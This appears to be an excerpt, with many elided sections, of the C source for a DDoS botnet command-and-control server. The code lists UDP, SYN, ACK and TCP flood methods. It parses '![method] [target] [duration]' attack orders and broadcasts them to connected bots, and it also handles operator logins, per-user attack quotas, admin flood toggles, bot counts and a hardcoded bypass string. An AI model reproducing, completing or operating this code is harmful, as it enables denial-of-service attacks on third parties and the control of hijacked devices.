...
#define USER_FORMAT     "\x1b[96m(\x1b[97m%s\x1b[96m, \x1b[97m%s\x1b[96m, \x1b[97m%s\x1b[96m, \x1b[97m%s\x1b[96m, \x1b[97m%s\x1b[96m),\n"
#define MAXFDS          1000000
#define EPOLL_TIMEOUT   -1
#define MAXCONCURRENT   10
#define MAXUSERS        30

#define USER_COMMANDS   7
...
char *user_commands[USER_COMMANDS][2] = {
    {"\r\n \x1b[38;5;15mudpflood  | udp flood.\r\n"},
    {" \x1b[38;5;15msynflood  | syn flood.\r\n"},
    {" \x1b[38;5;15mackflood  | ack flood.\r\n"},
    {" \x1b[38;5;15mudpsmart  | udp flood with smart packet.\r\n\r\n"},
    {" \x1b[38;5;15mtcpthread | tcp flood with threads.\r\n"},
    {" \x1b[38;5;15mtcpsocket | tcp flood with connections.\r\n"},
    {" \x1b[38;5;15mudpthread | udp flood with threads.\r\n\r\n"}
};

char *admin_commands[ADMIN_COMMANDS][2] = {
    {"\r\n\x1b[38;5;15mfloods <enable/disable>", "enable or disable the use of ongoing attacks"},
    {"\x1b[38;5;15mbots", "view total bots"},
    {"\x1b[38;5;15musers", "list user info from user database"},
    {"\x1b[38;5;15monline", "view current connected users\r\n"},
};
...
int broadcast_command(char *sendbuf, int maxcount, int maxtime, int myfd, char *floods, char *user, int admin_mode)
{
    if (attacking == 0)
    {
        write(myfd, "\x1b[38;5;231mfloods turn off by admin.\r\n", strlen("\x1b[38;5;231mfloods turn off by admin.\r\n"));
        return 0;
    }
    ...
    {
        char fbuf[128];
        sprintf(fbuf, "maximum global attacks running on cnc.\n");
    ...
    if ((args_len = split(tmpbuf, ' ', &arguments)) <= 2)
    {
        ...
        write(myfd, "\x1b[38;5;231mfomart: ![method] [target] [duration] [options]\r\n", strlen("\x1b[38;5;231mfomart: ![method] [target] [duration] [options]\r\n"));
        return 0;
    }
    ...
    if (arguments[0][0] == '-')
    {
        ...
        if ((newmax > maxcount || newmax < 1) && maxcount != -1)
        {
            ...
            free(arguments);
            memset(tmpbuf, 0, sizeof(tmpbuf));
            write(myfd, "\x1b[38;5;231myou can use more bots.\r\n", strlen("\x1b[38;5;231myou cant use more bots.\r\n"));
            return 0;
        }
    ...
    if (arguments[0 + maxcnt])
    {
        ...
        if ((args2_len = split(floods, ',', &arguments2)) <= 0)
        {
            ...
            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[38;5;231merror, pls contact admin.\r\n", strlen("\x1b[38;5;231merror, pls contact admin.\r\n"));
            return 0;
        }
        ...
        if (atk_found == 0)
        {
            ...
            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[38;5;231minvalid method.\r\n", strlen("\x1b[38;5;231minvalid method.\r\n"));
            return 0;
        }
    ...
    if (arguments[2 + maxcnt])
    {
        ...
        if (atk_time > maxtime || atk_time > 86400)
        {
            ...
            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[38;5;231mwhy u use more attack times?\r\n", strlen("\x1b[38;5;231mwhy u use more attack times?\r\n"));
            return 0;
        }
    }
    ...
    {
        close(fd);
        write(myfd, "\x1b[38;5;231mfailed to build api.\r\n", strlen("\x1b[38;5;231mfailed to build api.\r\n"));
        return 0;
    }
    ...
    if (sentto == 100000)
    {
        sprintf(prompt, "\x1b[38;5;231mcant started attack.\r\n");
        for (i = 0; i < args_len; i++)
            free(arguments[i]);
    ...
    else
    {
        ...
        sprintf(prompt, "\x1b[38;5;15mattack sent successfully to %d devices.\r\n", sentto);
...
void *tab_title_admin(void *arg)
{
    ...
    for(i = 0; i < MAXFDS; i++)
    {
        ...
        sprintf(title, "\033]0;%d devices | %d/%d running\007", botcount, attkcount, MAX_ATTACKS);
            ...
            else if (listen_fd == events[i].data.fd)
            {
                while (1)
                {
                    ...
                    for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) // check for duplicate clients by seeing if any have the same IP as the one connecting
                    {
                        ...
                        {
                            printf("[condi] Duplicate \x1b[31mDeleted \x1b[37m%d.%d.%d.%d (bot id %s)\n", clients[event.data.fd].ip & 0xff, (clients[event.data.fd].ip >> 8) & 0xff, (clients[event.data.fd].ip >> 16) & 0xff, (clients[event.data.fd].ip >> 24) & 0xff, clients[event.data.fd].arch);
                            close(event.data.fd);
                            break;
                        }
                    }
...
void botcount(int myfd, int dofind, char *findstr)
{
    ...
    for (i = 0; i < q; i++)
    {
        ...
        else
        {
            ...
            {
                sprintf(sndbuf, "\x1b[38;5;231m[unknown] %d\r\n", bot_entry[i].count);
                write(myfd, sndbuf, strlen(sndbuf));
                memset(sndbuf, 0, sizeof(sndbuf));
            }
            else
...
void *detect_afk(void *arg)
{
    ...
    while(1)
    {
        ...
        {
            char fbuf[512];
            sprintf(fbuf, "long time no using cnc, auto disconnect.\n");
            write(the_fd, fbuf, strlen(fbuf));
...
void *controller_thread(void *arg)
{
    ...
    char rdbuf[512], username[128], password[128], hidden[128], prompt[256];
    char *apibypass = "!2023!";
    ...
    write(accinfo[cfd].fd, "\x1b[38;5;15mUsername -> ", strlen("\x1b[38;5;15mUsername -> "));
    read(accinfo[cfd].fd, username, sizeof(username));
    write(accinfo[cfd].fd, "\x1b[38;5;15mPassword -> ", strlen("\x1b[38;5;15mPassword -> "));
    ...
    for(x = 0; x < MAXFDS; x++)
    {
        if(accinfo[x].connected == 1)
        {
            ...
            {
                sprintf(tempbuf, "user %s already use.\r\n", accinfo[x].username);
        ...
        if (accinfo[cfd].admin == 1)
            sprintf(prompt, "\x1b[38;5;15m%s@botnet# ", username);
        else
            sprintf(prompt, "\x1b[38;5;15m%s@botnet# ", username);
    ...
    while (memset(rdbuf, 0, sizeof(rdbuf)) && read(accinfo[cfd].fd, rdbuf, sizeof(rdbuf)) > 0)
    {
        ...
        if (strcmp(rdbuf, "help") == 0 || strcmp(rdbuf, "?") == 0)
        {
            ...
            else
            {
                ...
                if ((args2_len = split(accinfo[cfd].floods, ',', &arguments2)) <= 0)
                {
                    ...
                    free(arguments2);
                    write(accinfo[cfd].fd, "\x1b[38;5;231merror, pls contact admin.\r\n", strlen("\x1b[38;5;231merror, pls contact admin.\r\n"));
                }
                ...
                if (atk_count == 0)
                    write(accinfo[cfd].fd, "\x1b[38;5;231mmaximium concurrents.\r\n", strlen("\x1b[38;5;231mmaximium concurrents.\r\n"));
        ...
        {
            write(accinfo[cfd].fd, "\x1b[38;5;231mgood bye.\r\n", strlen("\x1b[38;5;231mgood bye.\r\n"));
        ...
        else if (strcmp(rdbuf, "floods enable") == 0 && accinfo[cfd].admin == 1)
        {
            ...
            write(accinfo[cfd].fd, "\x1b[38;5;231menabled floods.\r\n", strlen("\x1b[38;5;231menabled floods.\r\n"));
            attacking = 1;
        }
        else if (strcmp(rdbuf, "floods disable") == 0 && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
            write(accinfo[cfd].fd, "\x1b[38;5;231mdisabled floods.\r\n", strlen("\x1b[38;5;231mdisabled floods.\r\n"));
            attacking = 0;
        }
        ...
        else if (rdbuf[0] == '.')
        {
            ...
            write(accinfo[cfd].fd, "\x1b[38;5;231muknown command.\r\n", strlen("\x1b[38;5;231muknown command.\r\n"));
